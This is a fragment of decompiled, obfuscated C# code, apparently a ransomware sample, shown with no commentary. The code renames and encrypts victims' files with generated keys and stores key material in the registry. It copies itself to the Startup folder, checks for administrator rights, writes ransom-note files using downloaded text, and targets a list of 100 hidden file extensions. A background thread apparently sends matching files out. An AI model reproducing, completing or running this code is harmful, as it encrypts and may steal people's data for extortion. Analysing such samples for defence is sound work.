									if (OtvlrYHFRq)
									{
										NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
									}
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK);
								}
							}
							catch (Exception ex6)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107349118) + ex6.Message + getString_0(107396659));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								return;
							}
							if (NWwyysQYwQDK != getString_0(107397805))
							{
								CS_0024_003C_003E8__locals0.tDwFwsGDrP += NWwyysQYwQDK;
							}
							if (pRibgXhmfietto == getString_0(107396892))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in tnUDcbYyevrzGRJA)
									{
										if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.FBthsJRqPLob.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == UgmkrRPmQyDLrq.getString_0(107396898))
										{
											if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length)
											{
												try
												{
													hIHAEKpEeiS.SRnkQsJyJfqDTNo(UgmkrRPmQyDLrq.getString_0(107402163), UgmkrRPmQyDLrq.getString_0(107402158), UgmkrRPmQyDLrq.getString_0(107402177), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == UgmkrRPmQyDLrq.getString_0(107397155))
										{
											try
											{
												hIHAEKpEeiS.SRnkQsJyJfqDTNo(UgmkrRPmQyDLrq.getString_0(107402163), UgmkrRPmQyDLrq.getString_0(107402158), UgmkrRPmQyDLrq.getString_0(107402177), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
							string text2 = getString_0(107401596);
							text2 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : getString_0(107401596));
							string s = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dhEsUcbXeBeyR == getString_0(107397149))
							{
								byte[] array = null;
								byte[] byte_ = PsMAbAPGwNaiG.jZLDTviUrm(CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
								if (!PsMAbAPGwNaiG.teuDisObNXw(ipZGIkDRDrXd: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mbmsUAuYimuL.UGIyKRILFxs(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mbmsUAuYimuL.UGIyKRILFxs(byte_, Convert.FromBase64String(OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), TTIkAHWRYFFqFLX: CS_0024_003C_003E8__locals0.tDwFwsGDrP, ecklbfBlPisB: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!UpNccIaFzBadyA)
							{
								if (!kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!kLhUdzwWYwiYO.vhbsEfgZLCUjss(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (OtvlrYHFRq)
							{
								NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
							}
							string text3 = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
							string text4 = getString_0(107401596);
							text4 = (UpNccIaFzBadyA ? mZOauVQEiJhty.LLWNJpvtZdfwY() : getString_0(107401596));
							string s2 = pIZzeIXAyyFSd.QFUlfCNJcrFHq(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (NWwyysQYwQDK != getString_0(107397805))
							{
								if (!NbfRNVirWcO)
								{
									if (!UpNccIaFzBadyA)
									{
										QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk);
									}
									else
									{
										QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!UpNccIaFzBadyA)
										{
											elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
										}
										else
										{
											elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SWaMdrdKGgzowGl)
										{
											try
											{
												File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397823) + ex11.Message + getString_0(107396659));
											}
											catch (Exception)
											{
											}
										}
										ZzaknwGiCeEd++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!NbfRNVirWcO)
							{
								if (!UpNccIaFzBadyA)
								{
									QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397800), nQCMwcWKyQk);
								}
								else
								{
									QTDQnApWjFz(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397800), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!UpNccIaFzBadyA)
									{
										elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
									}
									else
									{
										elqAHaVgaqSN(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398577) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397823) + ex14.Message + getString_0(107396659));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									return;
								}
							}
							if (UpNccIaFzBadyA)
							{
								if (NWwyysQYwQDK != getString_0(107397805))
								{
									wTxBRYOuXVKuCY(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, bytes2);
								}
								else
								{
									wTxBRYOuXVKuCY(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
		}

		static MlhxfWYHvBPnrE()
		{
			Strings.CreateGetStringDelegate(typeof(MlhxfWYHvBPnrE));
		}
	}

	private sealed class LerVzbXIIhQ
	{
		public string JgoRvgBlnpx;

		public string pnnxcTqhyFOc;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(JgoRvgBlnpx);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(pnnxcTqhyFOc))
					{
						File.Delete(pnnxcTqhyFOc);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string mkgreXsNDfWo;

	public static byte[] nQCMwcWKyQk;

	public static string QotWPeyjvzjx;

	public static string FoLsSeMcEVuV;

	public static List<string> eaZULefnOUcJVI;

	public static List<string> DWWiJyUdyGLZ;

	public static string mNPIOHsqKQLjYmM;

	public static string OxsDDfqLEi;

	public static string lXgIUpLgAi;

	public static string GThDVKInjH;

	public static string utoTLqCAZdXAT;

	public static int HxkcxNLXyTDaNa;

	public static string NgbDiBVJKDTW;

	public static string yyZHaDaxUisnQ;

	public static string bLsbDQXmZdNKY;

	public static string gRvYTwveWAbrj;

	public static string aYGZeCWKzRZALiE;

	public static string xssnOTnwBJDngh;

	public static string AUaVXVYfCAD;

	public static string DdPuPlUptL;

	public static List<string> ZislTiThZFHv;

	public static List<string> IDUZlSGaIfn;

	public static string XaypzBwanzwZ;

	public static string EopvfOZJdoX;

	public static string bGtevrhmXNGWmrdhzSx;

	public static List<string> JEkdiihxCoWf;

	public static string HohHoEgJewvBWz;

	private static string JNWYtfmGycaH;

	public static string gsXyoeFOorGZ;

	public static string vNvhWDXlFGgZo;

	public static List<string> SoVrjAqLQHDY;

	public static List<string> tKhSHdXkDw;

	public static List<string> FcllHXSYzCkoLu;

	public static List<string> MRwbBvIEaNYw;

	public static string fJgPhlsQHtYagv;

	public static List<string> KIKFUpmawnRBIE;

	public static List<string> WjopLCEDSl;

	public static string dNiPJscrdZ;

	public static string pRwaCpJBKvM;

	internal static DateTime AiPmmCrNxON;

	internal static DateTime TyxvmRxEqTldBX;

	public static string krdgQbbXWsBnkAs;

	public static string bQealBkUmzhp;

	public static string IjKkEPdMxTo;

	public static string SsLdaQJOERuN;

	public static string zCYQvPmGdWb;

	public static string SwTuLSeNkXgX;

	public static string GZbePnAiKIwM;

	public static string pRibgXhmfietto;

	public static List<string> tnUDcbYyevrzGRJA;

	public static string OGIisKmpnCtjYJtSZ;

	public static string dKLzVpzOOKvyJbR;

	public static string HmOIvziEgj;

	public static string wWsTKhWTnA;

	public static string ceBfodBwRY;

	public static string YrUNJYkfZORc;

	public static string TECyIxCjZZeuQoS;

	public static string TLvIKeJnVejcNG;

	public static string cfLMhLbiCC;

	public static string dPIYrIPkEeCv;

	public static string LfrLWEkFCBwUa;

	public static string LHozEvFKfaDyxN;

	public static string ZQLLErbedcYeoR;

	public static string sWPChGvxft;

	public static string iEmzWvVANWWhs;

	public static string OXmgxFpvUExT;

	public static string EMMMLIMedETY;

	public static string OOffFbZtXHucK;

	public static string eBjqIYGqqxZnwj;

	public static string ZLERFztvScvXGTf;

	public static string ThomocmQwcHBb;

	public static string jIEUXOWHIovDRKPS;

	public static string lanIsMFtITLe;

	public static string cFytzeDiRIaBA;

	public static string ueuvoVAMScuH;

	public static string cXFsslHOuYyK;

	public static string dhEsUcbXeBeyR;

	public static string pUPogXfTsHTC;

	public static string XxUTdtdLXHJQFmlnR;

	public static string[] upziyoWzyCa;

	public static string RrpEvBQBLONZKo;

	public static bool OTLCmOpFsMP;

	public static string EBZNaOLOtuSLZ;

	public static bool UpNccIaFzBadyA;

	public static bool GyAtBojDqJQga;

	public static bool ZuXmDgobJnjb;

	public static bool XeXEhFhfYVvh;

	public static string bDDJFCkjBbYQ;

	public static bool SWaMdrdKGgzowGl;

	public static bool UaZSFbxCjFNZv;

	public static bool jnImjWIMcpl;

	public static bool bTMUTlJGkGOO;

	public static bool NbfRNVirWcO;

	public static string IKRtRLOSqagD;

	public static bool SidumIOOlYmWUm;

	public static Stopwatch VxQUKIskXHMm;

	public static int ZzaknwGiCeEd;

	public static int DPjjDEUnrYJ;

	public static bool OtvlrYHFRq;

	public static string YgTmUCLcTtww;

	public static string[] PheHPPQQekLUCKI;

	public static List<string> GDqBfWNbeWwjD;

	public static int PGvCWVOLTGYXz;

	public static bool uBpdQdBJjeZ;

	public static bool DBkpQAKkEJYsTWP;

	public static List<string> KvzIZcyvMdpOuBpa;

	public static List<string> sNjyjNkSlLc;

	public static List<string> bCfLyPvkjyFss;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			ltHpMWVMng CS_0024_003C_003E8__locals0 = new ltHpMWVMng();
			CS_0024_003C_003E8__locals0.vjohKiJyzSRaUeWhX = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.vjohKiJyzSRaUeWhX) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			dpalkuGHIDfC.oGSTDUMLXLD(JNWYtfmGycaH);
		}
		catch (Exception)
		{
		}
		try
		{
			if (cXFsslHOuYyK == getString_0(107396872))
			{
				Thread thread = new Thread(cxsIqhQqXHkEAbJ.SLTggmpsszzt);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (bLsbDQXmZdNKY == getString_0(107396872))
		{
			Thread.Sleep(int.Parse(gRvYTwveWAbrj));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && GZbePnAiKIwM == getString_0(107396872))
		{
			try
			{
				DpTTVKMlTgsKiQJt(UJcPFgFtVJhWf(getString_0(107396835)));
			}
			catch
			{
			}
		}
		try
		{
			if (AUaVXVYfCAD == getString_0(107396872) && BxhpTmysQW.qyynHeoZYRET())
			{
				new VnuNKsUxQyF().CVGxLNTbmXtfBQ(bool_0: false);
				BxhpTmysQW.RmhZfsvhkFI();
			}
		}
		catch (Exception)
		{
		}
		if (EopvfOZJdoX == getString_0(107396872) && BxhpTmysQW.qyynHeoZYRET())
		{
			new VnuNKsUxQyF().CVGxLNTbmXtfBQ(bool_0: false);
			new VnuNKsUxQyF().aYvfzoKhSvboqDi();
		}
		if (yyZHaDaxUisnQ == getString_0(107396872))
		{
			EVktfIUYgEnVdU.IsLybuZTVZrr();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396730);
			string text2 = text + Path.GetFileName(fileName);
			if (utoTLqCAZdXAT == getString_0(107396872) && fileName != text2)
			{
				Thread thread2 = new Thread(EYaoTyxjtvM);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (mNPIOHsqKQLjYmM == getString_0(107396872) && mainModule != null && fileName != text2)
			{
				try
				{
					HxkcxNLXyTDaNa = rPeIDKMaUitANmOZQ(0, ZislTiThZFHv.Count);
					File.Copy(fileName, text + ZislTiThZFHv[HxkcxNLXyTDaNa], overwrite: true);
					Process.Start(text + ZislTiThZFHv[HxkcxNLXyTDaNa]);
					vAKYzPfahgkUEj();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (dNiPJscrdZ == getString_0(107396872) && DateTime.Now < AiPmmCrNxON)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (pRwaCpJBKvM == getString_0(107396872) && DateTime.Now > TyxvmRxEqTldBX)
			{
				vAKYzPfahgkUEj();
			}
		}
		catch
		{
		}
		BhPnAViFMONUqk();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = tKhSHdXkDw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398230)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> fcllHXSYzCkoLu = FcllHXSYzCkoLu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398249)), string_0);
					};
				}
				Parallel.ForEach(fcllHXSYzCkoLu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (XxUTdtdLXHJQFmlnR == getString_0(107396872))
				{
					string[] source2 = upziyoWzyCa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398249)), getString_0(107398224) + string_0 + getString_0(107398215));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!MVOTvzaISsBSX().Contains(getString_0(107397911)))
				{
					HkTGZrARipJDX(fJgPhlsQHtYagv);
				}
				else
				{
					List<string> mRwbBvIEaNYw = MRwbBvIEaNYw;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							avwQPvqZWjHd(UJcPFgFtVJhWf(TZnpCqEjJZon(getString_0(107398178))), string_0);
						};
					}
					Parallel.ForEach(mRwbBvIEaNYw, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> kIKFUpmawnRBIE = KIKFUpmawnRBIE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398185)), string_0);
					};
				}
				Parallel.ForEach(kIKFUpmawnRBIE, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396725))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396725)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396740)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !eaZULefnOUcJVI.Contains(text6) && text6 != getString_0(107397231) && text6 != getString_0(107397178) && text6 != getString_0(107397189))
								{
									eaZULefnOUcJVI.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397160)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397115))
						{
							ZQLLErbedcYeoR = getString_0(107396872);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397138))
						{
							ZQLLErbedcYeoR = getString_0(107397129);
						}
					}
					if (text3.Contains(getString_0(107397124)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397115))
						{
							SidumIOOlYmWUm = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397138))
						{
							SidumIOOlYmWUm = false;
						}
					}
					if (text3.Contains(getString_0(107397107)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397115))
						{
							SWaMdrdKGgzowGl = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397138))
						{
							SWaMdrdKGgzowGl = false;
						}
					}
					if (text3.Contains(getString_0(107397094)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397115))
						{
							uBpdQdBJjeZ = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397138))
						{
							uBpdQdBJjeZ = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107397065) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (ZQLLErbedcYeoR == getString_0(107397129))
		{
			KWDSDiDIlff();
		}
		if (DBkpQAKkEJYsTWP)
		{
			try
			{
				Console.WriteLine(getString_0(107396988));
				jepDjgeTyRgHUiX.YFOsbGmjwKAz();
			}
			catch (Exception ex8)
			{
				if (SWaMdrdKGgzowGl)
				{
					try
					{
						File.AppendAllText(bDDJFCkjBbYQ, getString_0(107396455) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (ZQLLErbedcYeoR == getString_0(107396872))
		{
			try
			{
				AUEQPExuAGiGvUaT();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ZuXmDgobJnjb)
			{
				try
				{
					Thread thread4 = new Thread(NTwFCNJDlXe.bVAktnIcbtB);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			avwQPvqZWjHd(getString_0(107396378), UJcPFgFtVJhWf(getString_0(107396397)));
		}
		if (XaypzBwanzwZ == getString_0(107396872) && nTVEUrHbKpO() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(tFYEGaopZM.WytzYUVUhFF);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = vNvhWDXlFGgZo == getString_0(107396872);
		SecureString secureString = new SecureString();
		if (IjKkEPdMxTo == getString_0(107397129))
		{
			OxsDDfqLEi = mZOauVQEiJhty.EDDvgUfJeLkYZvyu(32);
			lXgIUpLgAi = mZOauVQEiJhty.LLWNJpvtZdfwY();
		}
		else
		{
			OxsDDfqLEi = getString_0(107396324);
		}
		GThDVKInjH = pIZzeIXAyyFSd.QFUlfCNJcrFHq(OxsDDfqLEi + lXgIUpLgAi);
		if (!UpNccIaFzBadyA)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(UJcPFgFtVJhWf(getString_0(107396247)));
				if (registryKey != null)
				{
					registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107396234)) + (registryKey.ValueCount + 1), GThDVKInjH);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(UJcPFgFtVJhWf(getString_0(107396247)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(UJcPFgFtVJhWf(getString_0(107396234)) + (registryKey2.ValueCount + 1), GThDVKInjH);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (TLvIKeJnVejcNG == getString_0(107396872))
		{
			VHDFsFRXsCVCnV();
		}
		if (jnImjWIMcpl)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD), string.Concat(UJcPFgFtVJhWf(getString_0(107396705)), new WebClient().DownloadString(UJcPFgFtVJhWf(getString_0(107396712))), getString_0(107396639), UJcPFgFtVJhWf(getString_0(107396634)), DateTime.Now, getString_0(107396639), UJcPFgFtVJhWf(getString_0(107396625)), GThDVKInjH));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD), getString_0(107396536) + GThDVKInjH);
				}
			}
			catch (Exception ex13)
			{
				if (SWaMdrdKGgzowGl)
				{
					try
					{
						File.AppendAllText(bDDJFCkjBbYQ, getString_0(107396507) + ex13.Message + getString_0(107396639));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		yJKOYFzqfaYSn.tUJFOtGiLvH(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ZLERFztvScvXGTf), KHFqolIuXSJb(GThDVKInjH), null, null, getString_0(107396490), getString_0(107395929), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			jfxQCoihyO();
		}
		try
		{
			try
			{
				if (SidumIOOlYmWUm)
				{
					Console.WriteLine(getString_0(107395944));
				}
			}
			catch
			{
			}
			RSpexIalouCsK(new string[1] { getString_0(107395863) }, new string[100]
			{
				getString_0(107395886),
				getString_0(107395881),
				getString_0(107395876),
				getString_0(107395835),
				getString_0(107395830),
				getString_0(107395857),
				getString_0(107395852),
				getString_0(107395847),
				getString_0(107395810),
				getString_0(107395805),
				getString_0(107395800),
				getString_0(107395827),
				getString_0(107395818),
				getString_0(107395813),
				getString_0(107395772),
				getString_0(107395767),
				getString_0(107395794),
				getString_0(107395789),
				getString_0(107395784),
				getString_0(107395747),
				getString_0(107395738),
				getString_0(107395733),
				getString_0(107395760),
				getString_0(107395755),
				getString_0(107395750),
				getString_0(107395713),
				getString_0(107395708),
				getString_0(107395703),
				getString_0(107395730),
				getString_0(107395725),
				getString_0(107395720),
				getString_0(107396195),
				getString_0(107396190),
				getString_0(107396185),
				getString_0(107396208),
				getString_0(107396203),
				getString_0(107396198),
				getString_0(107396161),
				getString_0(107395852),
				getString_0(107396156),
				getString_0(107395810),
				getString_0(107396179),
				getString_0(107396174),
				getString_0(107396169),
				getString_0(107396164),
				getString_0(107396127),
				getString_0(107396122),
				getString_0(107396117),
				getString_0(107396144),
				getString_0(107396139),
				getString_0(107396134),
				getString_0(107396097),
				getString_0(107396092),
				getString_0(107396087),
				getString_0(107396114),
				getString_0(107396109),
				getString_0(107396104),
				getString_0(107396067),
				getString_0(107396058),
				getString_0(107396053),
				getString_0(107396076),
				getString_0(107396031),
				getString_0(107396156),
				getString_0(107396050),
				getString_0(107396041),
				getString_0(107396000),
				getString_0(107395991),
				getString_0(107396014),
				getString_0(107396005),
				getString_0(107395968),
				getString_0(107395959),
				getString_0(107395982),
				getString_0(107395973),
				getString_0(107395424),
				getString_0(107395419),
				getString_0(107395414),
				getString_0(107395441),
				getString_0(107395436),
				getString_0(107395431),
				getString_0(107395390),
				getString_0(107395385),
				getString_0(107395380),
				getString_0(107395407),
				getString_0(107395402),
				getString_0(107395397),
				getString_0(107395356),
				getString_0(107395379),
				getString_0(107395374),
				getString_0(107396190),
				getString_0(107395369),
				getString_0(107395364),
				getString_0(107395327),
				getString_0(107395322),
				getString_0(107395317),
				getString_0(107395340),
				getString_0(107395335),
				getString_0(107395298),
				getString_0(107395289),
				getString_0(107395284),
				getString_0(107395311)
			}, new string[0], OxsDDfqLEi, getString_0(107395306));
		}
		catch (Exception ex15)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107395257) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
